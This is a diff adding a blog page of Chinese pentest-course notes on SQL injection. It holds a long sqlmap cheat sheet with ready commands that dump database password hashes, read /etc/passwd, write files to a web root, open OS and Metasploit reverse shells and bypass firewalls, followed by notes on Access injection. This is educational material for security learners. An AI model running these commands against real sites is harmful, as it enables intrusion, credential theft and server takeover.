@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入) | Tranquility</title><meta name="keywords" content="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"><meta name="author" content="LIKE"><meta name="copyright" content="LIKE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、sqlmap使用 基本操作笔记：-u  #注入点 -f  #指纹判别数据库类型 -b  #获取数据库版本信息 -p  #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p &quot;page,id&quot;) -D &quot;&quot;  #指定数据库名 -T &quot;&quot;  #指定表名 -C &quot;&quot;  #指定字段 -s &quot;&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)">
+<meta property="og:url" content="https://leekoscn.github.io/posts/fa45560e3521/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="1、sqlmap使用 基本操作笔记：-u  #注入点 -f  #指纹判别数据库类型 -b  #获取数据库版本信息 -p  #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p &quot;page,id&quot;) -D &quot;&quot;  #指定数据库名 -T &quot;&quot;  #指定表名 -C &quot;&quot;  #指定字段 -s &quot;&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leekoscn.github.io/img/hello-world.webp">
+<meta property="article:published_time" content="2023-08-22T10:05:22.617Z">
+<meta property="article:modified_time" content="2023-06-05T06:42:12.635Z">
+<meta property="article:author" content="LIKE">
+<meta property="article:tag" content="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leekoscn.github.io/img/hello-world.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://leekoscn.github.io/posts/fa45560e3521/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: LIKE","link":"链接: ","source":"来源: Tranquility","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-05 14:42:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/cursor.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.css"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">215</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/hello-world.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tranquility</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-22T10:05:22.617Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T06:42:12.635Z" title="更新于 2023-06-05 14:42:12">2023-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1、sqlmap使用"><a href="#1、sqlmap使用" class="headerlink" title="1、sqlmap使用"></a>1、sqlmap使用</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/NO4KTFgb7tQMIE8.png" alt="1344396-20180717215927537-734614556.png"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">基本操作笔记：<span class="operator">-</span>u  #注入点 </span><br><span class="line"></span><br><span class="line"><span class="operator">-</span>f  #指纹判别数据库类型 </span><br><span class="line"><span class="operator">-</span>b  #获取数据库版本信息 </span><br><span class="line"><span class="operator">-</span>p  #指定可测试的参数(?page<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>p &quot;page,id&quot;) </span><br><span class="line"><span class="operator">-</span>D &quot;&quot;  #指定数据库名 </span><br><span class="line"><span class="operator">-</span>T &quot;&quot;  #指定表名 </span><br><span class="line"><span class="operator">-</span>C &quot;&quot;  #指定字段 </span><br><span class="line"><span class="operator">-</span>s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：<span class="operator">-</span>s &quot;xx.log&quot;　　恢复:<span class="operator">-</span>s &quot;xx.log&quot; <span class="comment">--resume) </span></span><br><span class="line"><span class="comment">--level=(1-5) #要执行的测试水平等级，默认为1 </span></span><br><span class="line"><span class="comment">--risk=(0-3)  #测试执行的风险等级，默认为1 </span></span><br><span class="line"><span class="comment">--time-sec=(2,5) #延迟响应，默认为5 </span></span><br><span class="line"><span class="comment">--data #通过POST发送数据 </span></span><br><span class="line"><span class="comment">--columns        #列出字段 </span></span><br><span class="line"><span class="comment">--current-user   #获取当前用户名称 </span></span><br><span class="line"><span class="comment">--current-db     #获取当前数据库名称 </span></span><br><span class="line"><span class="comment">--users          #列数据库所有用户 </span></span><br><span class="line"><span class="comment">--passwords      #数据库用户所有密码 </span></span><br><span class="line"><span class="comment">--privileges     #查看用户权限(--privileges -U root) </span></span><br><span class="line"><span class="operator">-</span>U               #指定数据库用户 </span><br><span class="line"><span class="comment">--dbs            #列出所有数据库 </span></span><br><span class="line"><span class="comment">--tables -D &quot;&quot;   #列出指定数据库中的表 </span></span><br><span class="line"><span class="comment">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span></span><br><span class="line"><span class="comment">--dump-all            #列出所有数据库所有表 </span></span><br><span class="line"><span class="comment">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span></span><br><span class="line"><span class="comment">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span></span><br><span class="line"><span class="comment">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span></span><br><span class="line"><span class="comment">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span></span><br><span class="line"><span class="comment">--os      #指定系统(Linux,Windows) </span></span><br><span class="line"><span class="operator">-</span>v  #详细的等级(<span class="number">0</span><span class="number">-6</span>) </span><br><span class="line">    <span class="number">0</span>：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    <span class="number">1</span>：显示信息和警告消息。 </span><br><span class="line">    <span class="number">2</span>：显示调试消息。 </span><br><span class="line">    <span class="number">3</span>：有效载荷注入。 </span><br><span class="line">    <span class="number">4</span>：显示HTTP请求。 </span><br><span class="line">    <span class="number">5</span>：显示HTTP响应头。 </span><br><span class="line">    <span class="number">6</span>：显示HTTP响应页面的内容 </span><br><span class="line"><span class="comment">--privileges  #查看权限 </span></span><br><span class="line"><span class="comment">--is-dba      #是否是数据库管理员 </span></span><br><span class="line"><span class="comment">--roles       #枚举数据库用户角色 </span></span><br><span class="line"><span class="comment">--udf-inject  #导入用户自定义函数（获取系统权限） </span></span><br><span class="line"><span class="comment">--union-check  #是否支持union 注入 </span></span><br><span class="line"><span class="comment">--union-cols #union 查询表记录 </span></span><br><span class="line"><span class="comment">--union-test #union 语句测试 </span></span><br><span class="line"><span class="comment">--union-use  #采用union 注入 </span></span><br><span class="line"><span class="comment">--union-tech orderby #union配合order by </span></span><br><span class="line"><span class="comment">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span></span><br><span class="line"><span class="comment">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span></span><br><span class="line"><span class="comment">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span></span><br><span class="line"><span class="comment">--user-agent &quot;&quot;  #自定义user-agent </span></span><br><span class="line"><span class="comment">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span></span><br><span class="line"><span class="comment">--string=&quot;&quot;    #指定关键词,字符串匹配. </span></span><br><span class="line"><span class="comment">--threads 　　  #采用多线程(--threads 3) </span></span><br><span class="line"><span class="comment">--sql-shell    #执行指定sql命令 </span></span><br><span class="line"><span class="comment">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span></span><br><span class="line"><span class="comment">--file-read    #读取指定文件 </span></span><br><span class="line"><span class="comment">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span></span><br><span class="line"><span class="comment">--file-dest    #要写入的文件绝对路径 </span></span><br><span class="line"><span class="comment">--os-cmd=id    #执行系统命令 </span></span><br><span class="line"><span class="comment">--os-shell     #系统交互shell </span></span><br><span class="line"><span class="comment">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span></span><br><span class="line"><span class="comment">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span></span><br><span class="line"><span class="comment">--os-smbrelay  # </span></span><br><span class="line"><span class="comment">--os-bof       # </span></span><br><span class="line"><span class="comment">--reg-read     #读取win系统注册表 </span></span><br><span class="line"><span class="comment">--priv-esc     # </span></span><br><span class="line"><span class="comment">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span></span><br><span class="line"><span class="operator">-</span>p &quot;user-agent&quot; <span class="comment">--user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span></span><br><span class="line"><span class="comment">--eta          #盲注 </span></span><br><span class="line"><span class="operator">/</span>pentest<span class="operator">/</span>database<span class="operator">/</span>sqlmap<span class="operator">/</span>txt<span class="operator">/</span></span><br><span class="line">common<span class="operator">-</span>columns.txt　　字段字典　　　 </span><br><span class="line">common<span class="operator">-</span>outputs.txt </span><br><span class="line">common<span class="operator">-</span>tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle<span class="operator">-</span><span class="keyword">default</span><span class="operator">-</span>passwords.txt </span><br><span class="line"><span class="keyword">user</span><span class="operator">-</span>agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">常用语句 :</span><br><span class="line"><span class="number">1.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>f <span class="operator">-</span>b <span class="comment">--current-user --current-db --users --passwords --dbs -v 0 </span></span><br><span class="line"><span class="number">2.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--passwords -U root --union-use -v 2 </span></span><br><span class="line"><span class="number">3.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span></span><br><span class="line"><span class="number">4.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span></span><br><span class="line"><span class="number">5.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--sql-shell -v 2 </span></span><br><span class="line"><span class="number">6.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--file-read &quot;c:\boot.ini&quot; -v 2 </span></span><br><span class="line"><span class="number">7.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span></span><br><span class="line"><span class="number">8.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--os-cmd &quot;id&quot; -v 1 </span></span><br><span class="line"><span class="number">9.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--os-shell --union-use -v 2 </span></span><br><span class="line"><span class="number">10.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span></span><br><span class="line"><span class="number">11.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--os-pwn --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="number">12.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--os-bof --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="number">13.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span></span><br><span class="line"><span class="number">14.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>b <span class="comment">--eta </span></span><br><span class="line"><span class="number">15.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; <span class="operator">-</span>p id <span class="comment">--prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line"><span class="number">16.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; <span class="comment">--auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span></span><br><span class="line"><span class="number">17.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>l burp.log <span class="comment">--scope=&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line"><span class="number">18.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span></span><br><span class="line"><span class="number">19.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span></span><br><span class="line"><span class="number">20.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; <span class="comment">--common-tables -D testdb --banner </span></span><br><span class="line"><span class="number">21.</span><span class="operator">/</span>sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; <span class="comment">--cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span></span><br><span class="line"></span><br><span class="line">简单的注入流程 :</span><br><span class="line"><span class="number">1.</span>读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>f <span class="operator">-</span>b <span class="comment">--current-user --current-db -v 1 </span></span><br><span class="line"><span class="number">2.</span>判断当前数据库用户权限 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--privileges -U 用户名 -v 1 </span></span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--is-dba -U 用户名 -v 1 </span></span><br><span class="line"><span class="number">3.</span>读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--users --passwords -v 2 </span></span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--passwords -U root -v 2 </span></span><br><span class="line"><span class="number">4.</span>获取所有数据库 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--dbs -v 2 </span></span><br><span class="line"><span class="number">5.</span>获取指定数据库中的所有表 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--tables -D mysql -v 2 </span></span><br><span class="line"><span class="number">6.</span>获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--columns -D mysql -T users -v 2 </span></span><br><span class="line"><span class="number">7.</span>获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span></span><br><span class="line"><span class="number">8.</span>file<span class="operator">-</span>read读取web文件 </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--file-read &quot;/etc/passwd&quot; -v 2 </span></span><br><span class="line"><span class="number">9.</span>file<span class="operator">-</span>write写入文件到web </span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>www.xxxxx.com<span class="operator">/</span>test.php?p<span class="operator">=</span><span class="number">2</span> <span class="comment">--file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="2、Access注入"><a href="#2、Access注入" class="headerlink" title="2、Access注入"></a>2、Access注入</h1><p>Access数据库的组成（相比于MySQL等数据库，Access数据库没有数据库这一层，相当于每个网站的数据库都是独立的，没有跨库注入，只能暴力破解）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access数据库：</span><br><span class="line">	表名：</span><br><span class="line">		列名：</span><br><span class="line">			数据：</span><br><span class="line">			</span><br><span class="line">MySQL数据库：</span><br><span class="line">	数据库名：</span><br><span class="line">		表名：</span><br><span class="line">			列名:</span><br><span class="line">				数据：</span><br></pre></td></tr></table></figure>
+
+<p>access 数据库都是存放在网站目录下，后缀格式为 mdb，accdb等可以通过一些暴库手段、目录猜解等直接下载数据库，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">access无法使用： union select 1,2,3,4格式，</span><br><span class="line"></span><br><span class="line">必须指定要从哪个表中查询，例如：union select 1,2,3 from user</span><br></pre></td></tr></table></figure>
+
+<p><strong>access三大攻击手法</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.access注入攻击片段-联合查询法</span><br><span class="line">2.access注入攻击片段-逐字猜解法</span><br><span class="line">3.工具类的使用注入（推荐）</span><br></pre></td></tr></table></figure>
+
+<p><strong>Access注入攻击方式</strong></p>
+<p>主要有：union 注入、http header 注入、偏移注入等</p>
+<h2 id="EXISTS-运算符"><a href="#EXISTS-运算符" class="headerlink" title="EXISTS 运算符"></a>EXISTS 运算符</h2><p>EXISTS 运算符用于判断查询子句是否有记录，如果有一条或多条记录存在返回 <strong>True</strong>，否则返回 False。</p>
